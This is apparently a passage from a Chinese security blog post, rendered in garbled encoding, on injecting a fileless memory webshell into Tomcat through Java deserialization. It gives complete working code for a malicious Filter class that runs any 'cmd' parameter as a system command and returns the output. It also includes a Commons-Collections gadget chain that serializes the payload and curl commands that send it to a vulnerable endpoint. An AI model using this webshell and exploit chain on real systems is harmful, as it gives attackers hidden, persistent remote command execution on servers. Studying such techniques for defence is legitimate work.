å¹¶ä¸”æ³¨å†ŒfilterMap filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),false,new String[]{FILTER_URL_PATTERN}); // æ¢å¤çŠ¶æ€ï¼Œä½¿æœåŠ¡æ­£å¸¸ä½¿ç”¨ if(stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } æ³¨å†ŒFilterConfig:\nç¬¬ä¸€ç§æ–¹æ³•ï¼š\næˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è·å¾—StandardContextå¯¹è±¡çš„filterConfigså±æ€§ï¼Œç„¶åå®ä¾‹åŒ–å°è£…ä¸€ä¸ªFilterConfigå¯¹è±¡ï¼Œç„¶åç›´æ¥å°†å…¶æ·»åŠ åˆ°filterConfigsä¸­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 //è·å¾—filterconfigs Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); // å®ä¾‹åŒ–ä¸€ä¸ªApplicationFilterConfigå¯¹è±¡ Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef); // filterConfigçš„Mapæ˜¯ä¸€ä¸ªHashMapç±»å‹çš„ï¼Œç›´æ¥å‹å…¥å°±å¯ä»¥ filterConfigs.put(name,filterConfig); ç¬¬äºŒç§æ–¹æ³•ï¼š\nåœ¨StandardContextä¸­çš„æ–¹æ³•filterStartå®ç°äº†æ ¹æ®filterDefsç”ŸæˆfilterConfigsã€‚\nå› æ­¤æˆ‘ä»¬é€šè¿‡åå°„ç›´æ¥æ‰§è¡ŒfilterStartæ–¹æ³•å°±å¯ä»¥å®ç°æ³¨å†ŒFilterConfig\n1 2 3 4 // è®¾ç½®filterä¹‹åè°ƒç”¨ filterstart æ¥å¯åŠ¨æˆ‘ä»¬çš„ filter java.lang.reflect.Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); è‡ªå®šä¹‰filterä¼˜å…ˆ å›çœ‹org.apache.catalina.core.ApplicationFilterFactory#createFilterChainçš„ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // Add the relevant path-mapped filters to this filter chain for (FilterMap filterMap : filterMaps) { if (!matchDispatcher(filterMap, dispatcher)) { continue; } if (!matchFiltersURL(filterMap, requestPath)) { continue; } ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName()); if (filterConfig == null) { // FIXME - log configuration problem continue; } filterChain.addFilter(filterConfig); } åˆ›å»ºçš„é¡ºåºæ˜¯æ ¹æ®filterMapsçš„é¡ºåºæ¥çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰å¿…è¦å»ä¿®æ”¹æˆ‘ä»¬æ·»åŠ çš„filteré¡ºåºåˆ°ç¬¬ä¸€ä½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹æˆ‘ä»¬æ³¨å†Œçš„filterMapåœ¨filterMapsä¸­æ˜¯ç¬¬ä¸€ä¸ªå°±å¯ä»¥äº†ã€‚\nä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /** * å°†æˆ‘ä»¬çš„ filtermap æ’å…¥åˆ°æœ€å‰é¢ */ Class ccc = null; try { ccc = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\"); } catch (Throwable t){} if (ccc == null) { try { ccc = Class.forName(\"org.apache.catalina.deploy.FilterMap\"); } catch (Throwable t){} } //æŠŠfilteræ’åˆ°ç¬¬ä¸€ä½ java.lang.reflect.Method m = Class.forName(\"org.apache.catalina.core.StandardContext\") .getDeclaredMethod(\"findFilterMaps\"); Object[] filterMaps = (Object[]) m.invoke(standardContext); Object[] tmpFilterMaps = new Object[filterMaps.length]; int index = 1; for (int i = 0; i \u003c filterMaps.length; i++) { Object o = filterMaps[i]; m = ccc.getMethod(\"getFilterName\"); String name = (String) m.invoke(o); if (name.equalsIgnoreCase(FILTER_NAME)) { tmpFilterMaps[0] = o; } else { tmpFilterMaps[index++] = filterMaps[i]; } } for (int i = 0; i \u003c filterMaps.length; i++) { filterMaps[i] = tmpFilterMaps[i]; } å…¶å®è¿™æ­¥éª¤ä¹Ÿæ˜¯å¯ä»¥ä¸è¦çš„,å› ä¸ºæˆ‘ä»¬åœ¨addMappingForUrlPatterns(EnumSet dispatcherTypes, boolean isMatchAfter, String... urlPatterns)æ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬åªè¦ä¼ å…¥çš„isMatchAfterä¸ºfalseï¼Œé‚£ä¹ˆæˆ‘ä»¬å®é™…ä¸Šå°±å¯ä»¥ç›´æ¥è°ƒç”¨addFilterMapBeforeæ–¹æ³•ï¼Œå°†filterMapæ”¾åˆ°filterMapsçš„æœ€å‰é¢ã€‚\n1 2 // è®¾ç½®åŸºæœ¬çš„url pattern, å¹¶ä¸”æ³¨å†ŒfilterMapï¼Œè®¾ç½®isMatchAfterä¸ºfalse,æ‰§è¡ŒaddFilterMapBeforeæ–¹æ³•ï¼Œä½¿filterMapæ’å…¥çš„æ—¶å€™åœ¨æœ€å‰é¢ã€‚ filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),false,new String[]{FILTER_URL_PATTERN}); æœ€åæ­¥éª¤äºŒçš„å®Œæ•´POCä»£ç å¦‚ä¸‹ï¼š\nç»§æ‰¿äº†AbstractTransletç±»(æºå¸¦æ¶æ„å­—èŠ‚ç åˆ°æœåŠ¡ç«¯åŠ è½½æ‰§è¡Œ)ï¼ŒåŒæ—¶å®ç°äº†Filteræ¥å£ï¼Œä½œä¸ºè‡ªå®šä¹‰çš„Filterï¼Œåœ¨å®ƒçš„doFilteræ–¹æ³•ä¸­ï¼Œå¯¹ä¼ å…¥çš„å‘½ä»¤å‚æ•°æ‰§è¡Œå‘½ä»¤ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 package Evil; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; /** * @ClassName TomcatShellInject * @Description TODO * @Author reus09 * @Date 2023/4/16 22:07 * @Version 1.0 **/ public class TomcatShellInject extends AbstractTranslet implements Filter { /** * webshellå‘½ä»¤å‚æ•°å */ private final String cmdParamName = \"cmd\"; private final static String FILTER_URL_PATTERN = \"/*\"; private final static String FILTER_NAME = \"reus09\"; static { try { javax.servlet.ServletContext servletContext = getServletContext(); if(servletContext != null){ org.apache.catalina.core.StandardContext standardContext = null; // åˆ¤æ–­è¯¥filter æ˜¯å¦å·²å­˜åœ¨ if(servletContext.getFilterRegistration(FILTER_NAME) == null){ java.lang.reflect.Field ctx = servletContext.getClass().getDeclaredField(\"context\"); ctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) ctx.get(servletContext); java.lang.reflect.Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); standardContext = (StandardContext) stdctx.get(applicationContext); if(standardContext != null){ //ä¿®æ”¹çŠ¶æ€ï¼Œè¦ä¸ç„¶è°ƒç”¨addFilteræ–¹æ³•æ²¡æœ‰æ•ˆæœ java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); //åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„Filteré©¬ Filter filter = new TomcatShellInject(); // è°ƒç”¨addFilter æ–¹æ³•æ·»åŠ  javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(FILTER_NAME,filter); // è¿›è¡Œä¸€äº›ç®€å•çš„è®¾ç½® filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); // è®¾ç½®åŸºæœ¬çš„url pattern filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),false,new String[]{FILTER_URL_PATTERN}); // å›å¤çŠ¶æ€ï¼Œä½¿æœåŠ¡æ­£å¸¸ä½¿ç”¨ if(stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } // åœ¨è®¾ç½®ä¹‹åæˆ‘ä»¬éœ€è¦ è°ƒç”¨ filterstart if (standardContext != null){ // è®¾ç½®filterä¹‹åè°ƒç”¨ filterstart æ¥å¯åŠ¨æˆ‘ä»¬çš„ filter java.lang.reflect.Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); } } } } }catch (Exception e){ e.printStackTrace(); } } public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ServletRequest servletRequest = null; /*shellæ³¨å…¥ï¼Œå‰æéœ€è¦èƒ½æ‹¿åˆ°requestã€responseç­‰*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //ä¸ä¸ºç©ºåˆ™æ„å‘³ç€ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„å‡†å¤‡å·¥ä½œå·²æˆåŠŸ if (threadLocal != null \u0026\u0026 threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } assert servletRequest != null; ServletContext servletContext = servletRequest.getServletContext(); if(servletContext != null){ return servletContext; }else{ return null; } } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println( \"TomcatShellInject doFilter.....................................................................\"); String cmd; if ((cmd = request.getParameter(cmdParamName)) != null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } response.getOutputStream().write(stringBuilder.toString().getBytes()); response.getOutputStream().flush(); response.getOutputStream().close(); return; } chain.doFilter(request,response); } @Override public void destroy() { } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(FilterConfig filterConfig) throws ServletException { } } å®ç° ä½¿ç”¨CC11é“¾å°†TomatEchoInjectå’ŒTomcatShellInjectä¸¤ä¸ªæ¶æ„ç±»åºåˆ—åŒ–ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package Evil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; /** * @ClassName CC11 * @Description TODO * @Author reus09 * @Date 2023/3/17 15:58 * @Version 1.0 **/ public class CC11 { public static void setFieldValue(Object obj, String fileNmae, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fileNmae); field.setAccessible(true); field.set(obj,value); } public static void main(String[] args) throws Exception { // æ„é€ æ¶æ„ TemplatesImpl å¯¹è±¡ TemplatesImpl obj = new TemplatesImpl(); // è·å–æ¶æ„ç±»çš„å­—èŠ‚ç  byte[] code = Files.readAllBytes(Paths.get(\"/Users/reus09/Desktop/MemoryShell/target/classes/Evil/TomcatEchoInject.class\")); byte[][] codes = {code}; // åå°„ä¿®æ”¹å±æ€§ setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); // ================ // åˆ©ç”¨ InvokerTransformer è°ƒç”¨ TemplatesImpl.newTransformer //InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\", null, null); // tostrng InvokerTransformer invokertransformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); //=============== Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, invokertransformer); TiedMapEntry tme = new TiedMapEntry(outerMap,\"reus09\"); Map expMap = new HashMap(); expMap.put(tme, \"reus09\"); innerMap.remove(obj); setFieldValue(invokertransformer, \"iMethodName\",\"newTransformer\" ); setFieldValue(tme,\"key\",obj); // ============== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² // ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(\"./TomcatEchoInject.ser\")); ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(\"./TomcatShellInject.ser\")); oss.writeObject(expMap); oss.close(); } } ç„¶ååˆ©ç”¨ curl è¿›è¡Œæ³¨å…¥å³å¯\né¦–å…ˆæ³¨å…¥ TomcatEchoInject.ser\n1 curl http://localhost:8080/evil --data-binary \"@/Users/xxx/xxx/TomcatEchoInject.ser\" ç„¶åæ³¨å…¥TomcatShellInject.ser\n1 curl http://localhost:8080/evil --data-binary \"@/Users/xxx/xxx/TomcatShellInject.ser\" å¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯æŠ¥é”™ï¼Œè¯´æ˜æ¶æ„çš„AbstractTransletå·²æˆåŠŸååºåˆ—åŒ–ã€‚\nå¹¶ä¸”åœ¨å†…å­˜ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ä¼˜å…ˆæ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„Filter:TomcatShellInject.\nç„¶åå‘½ä»¤æ‰§è¡Œï¼š\nç‘•ç–µ è¿™ç§åˆ©ç”¨æ–¹å¼å®ç°äº†æ— è½åœ°çš„å†…å­˜é©¬æ³¨å…¥ï¼Œä½†æ˜¯ä¹Ÿæœ‰å°ç¼ºé™·ï¼Œå¯¹äºShiroç»„ä»¶çš„ç³»ç»Ÿæ— æ³•å®ç°ï¼Œå› ä¸ºåœ¨org.apache.catalina.core.ApplicationFilterChain#internalDoFilteræ–¹æ³•ä¸­ï¼Œåœ¨å¯¹lastServicedRequestå’ŒlastServicedResponseèµ‹å€¼å‰ï¼Œä¼šå…ˆæ‰§è¡Œfilter.doFilter(request, response, this)ï¼Œæ‰§è¡Œå®Œæ‰€æœ‰çš„Filterã€‚\nä½†æ˜¯åœ¨Shiroä¸­ï¼Œå…¶å®å°±æ˜¯è‡ªå·±å®ç°çš„filter\næˆ‘ä»¬çš„Shiroååºåˆ—åŒ–æ¼æ´è§¦å‘ç‚¹ï¼šorg.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentityæ–¹æ³•é‡Œé¢è°ƒç”¨äº†org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipalsæ–¹æ³•ï¼Œåœ¨é‡Œé¢å¯¹ä¼ å…¥çš„bytesè¿›è¡ŒAESè§£å¯†åè¿›è¡Œååºåˆ—åŒ–ã€‚\nShiroçš„RemberMeåŠŸèƒ½å…¶å®åœ¨org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternalæ–¹æ³•é‡Œé¢é€šè¿‡createSubjecté‡Œé¢é€æ­¥å®ç°ã€‚\nå› æ­¤å¯¹äºShiroçš„ååºåˆ—åŒ–ï¼Œåœ¨å¯¹lastServicedRequestå’ŒlastServicedResponseèµ‹å€¼å‰ï¼Œå…ˆæ‰§è¡ŒShiroçš„Filterï¼Œåœ¨Filteré‡Œé¢å­˜åœ¨ååºåˆ—åŒ–è§¦å‘ç‚¹ï¼Œè€Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„lastServicedRequestå’ŒlastServicedResponseè¿˜æœªèµ‹å€¼ï¼Œå› æ­¤æ— æ³•é€šæ€Shiroã€‚\n",
  "wordCount" : "8109",
  "inLanguage": "en",
  "datePublished": "2023-04-16T21:25:18+08:00",
  "dateModified": "2023-04-16T21:25:18+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/tech/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="">Home</a>&nbsp;Â»&nbsp;<a href="/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="/posts/tech/">ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯</a></div>
    <h1 class="post-title">
      Tomcatæ— æ–‡ä»¶å†…å­˜é©¬
    </h1>
    <div class="post-meta"><span title='2023-04-16 21:25:18 +0800 +0800'>2023-04-16</span>&nbsp;Â·&nbsp;17 min&nbsp;Â·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e5%89%8d%e8%a8%80" aria-label="å‰è¨€">å‰è¨€</a></li>
                    <li>
                        <a href="#%e5%9b%9e%e6%98%be%e9%97%ae%e9%a2%98" aria-label="å›æ˜¾é—®é¢˜">å›æ˜¾é—®é¢˜</a></li>
                    <li>
                        <a href="#%e5%86%85%e5%ad%98%e9%a9%ac%e5%ae%9e%e7%8e%b0" aria-label="å†…å­˜é©¬å®ç°">å†…å­˜é©¬å®ç°</a><ul>
                            
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e7%8e%af%e5%a2%83" aria-label="æ¼æ´ç¯å¢ƒ">æ¼æ´ç¯å¢ƒ</a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%b3%a8%e5%85%a5" aria-label="ååºåˆ—åŒ–æ³¨å…¥">ååºåˆ—åŒ–æ³¨å…¥</a><ul>
                            
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a4%e4%b8%80" aria-label="æ­¥éª¤ä¸€">æ­¥éª¤ä¸€</a></li>
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a4%e4%ba%8c" aria-label="æ­¥éª¤äºŒ">æ­¥éª¤äºŒ</a><ul>
                            
                    <li>
                        <a href="#%e8%8e%b7%e5%be%97servletcontext" aria-label="è·å¾—ServletContext">è·å¾—ServletContext</a></li>
                    <li>
                        <a href="#%e6%b3%a8%e5%86%8cfilter" aria-label="æ³¨å†ŒFilter">æ³¨å†ŒFilter</a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%98%e4%b8%80" aria-label="é—®é¢˜ä¸€">é—®é¢˜ä¸€</a></li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%98%e4%ba%8c" aria-label="é—®é¢˜äºŒ">é—®é¢˜äºŒ</a></li>
                    <li>
                        <a href="#%e8%87%aa%e5%ae%9a%e4%b9%89filter%e4%bc%98%e5%85%88" aria-label="è‡ªå®šä¹‰filterä¼˜å…ˆ">è‡ªå®šä¹‰filterä¼˜å…ˆ</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e5%ae%9e%e7%8e%b0" aria-label="å®ç°">å®ç°</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e7%91%95%e7%96%b5" aria-label="ç‘•ç–µ">ç‘•ç–µ</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="å‰è¨€">å‰è¨€<a hidden class="anchor" aria-hidden="true" href="#å‰è¨€">#</a></h2>
<p>ä¹‹å‰å­¦ä¹ äº†Tomcatçš„ç›¸å…³å†…å­˜é©¬ï¼Œé€šè¿‡jspæ–‡ä»¶ç®€å•å­¦ä¹ å®ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›ç‘•ç–µçš„ï¼Œå†…å­˜é©¬ç”Ÿæˆè¿‡ç¨‹ä¸­è¿˜æ˜¯æœ‰webshellæ–‡ä»¶è½åœ°çš„ã€‚</p>
<p>ç°åœ¨é€šè¿‡<code>å¤©ä¸‹å¤§æœ¨å¤´</code>,<code>threedr3am</code>å¸ˆå‚…çš„åšå®¢å­¦ä¹ ä¸€ä¸‹é€šè¿‡ååºåˆ—åŒ–å®ç°å†…å­˜é©¬çš„ç”Ÿæˆã€‚</p>
<h2 id="å›æ˜¾é—®é¢˜">å›æ˜¾é—®é¢˜<a hidden class="anchor" aria-hidden="true" href="#å›æ˜¾é—®é¢˜">#</a></h2>
<p>jspä¸­å†…ç½®äº†requestå’Œresponseï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è·å–åˆ°ï¼Œé€šè¿‡requestè·å–å‚æ•°ï¼Œresponseå†™æˆ‘ä»¬çš„å›æ˜¾å†…å®¹ã€‚</p>
<p>æˆ‘ä»¬è¦ç»“åˆååºåˆ—åŒ–æ‰“ï¼Œæ³¨å…¥çš„æ˜¯å­—èŠ‚ç ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€äº›æ‰‹æ®µè·å–åˆ°requestå’Œresponseï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å›æ˜¾ã€‚</p>
<p>è¿™é‡Œçœ‹ä¸€ä¸‹tomcatå¤„ç†httpè¯·æ±‚çš„å †æ ˆæƒ…å†µï¼Œå‘ç°requestå’Œresponseä¸€è·¯ä¼ é€’ï¼Œå¹¶ä¸”åœ¨å†…å­˜ä¸­éƒ½æ˜¯åŒä¸€ä¸ªå˜é‡ï¼Œä½†æ˜¯æ¯ä¸ªå‡½æ•°éƒ½æ˜¯é€šè¿‡ä¼ å‚çš„çš„æ–¹å¼è¿›è¡Œä¼ é€’requestå’Œresponseã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417012148722.png" alt="image-20230417012148722"  />
</p>
<p><code>kingkk </code>å¸ˆå‚…çš„æ€è·¯æ˜¯å¯»æ‰¾ä¸€ä¸ªé™æ€çš„å¯ä»¥å­˜å‚¨ request å’Œ response çš„å˜é‡ï¼Œå› ä¸ºå¦‚æœä¸æ˜¯é™æ€çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦è·å–åˆ°å¯¹åº”çš„å®ä¾‹ã€‚</p>
<p>æœ€ç»ˆkingkk å¸ˆå‚…åœ¨<code>org.apache.catalina.core.ApplicationFilterChain</code>è¿™ä¸ªç±»ä¸­ï¼Œæ‰¾åˆ°äº†ç¬¦åˆè¦æ±‚çš„å˜é‡ï¼Œè¿™é‡Œ<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>éƒ½æ˜¯é™æ€å˜é‡ï¼Œæ˜¯å…¨å±€çš„ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417012618828.png" alt="image-20230417012618828"  />
</p>
<p>çœ‹ä¸€ä¸‹<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>åœ¨å“ªäº›åœ°æ–¹å­˜åœ¨è°ƒç”¨ã€‚</p>
<p>é¦–å…ˆåœ¨<code>org.apache.catalina.core.ApplicationFilterChain</code>ç±»ä¸­ï¼Œåœ¨é™æ€ä»£ç å—ä¼šè¿›è¡Œ<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>çš„åˆå§‹åŒ–ï¼Œå› ä¸ºApplicationDispatcher.WRAP_SAME_OBJECT é»˜è®¤ä¸º False ,æ ¹æ®é™æ€ä»£ç å—çš„æœ€ä¼˜å…ˆæ‰§è¡Œé¡ºåºï¼Œ<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>ä¼šåˆå§‹åŒ–ä¸ºnull.</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417013305966.png" alt="image-20230417013305966"  />
</p>
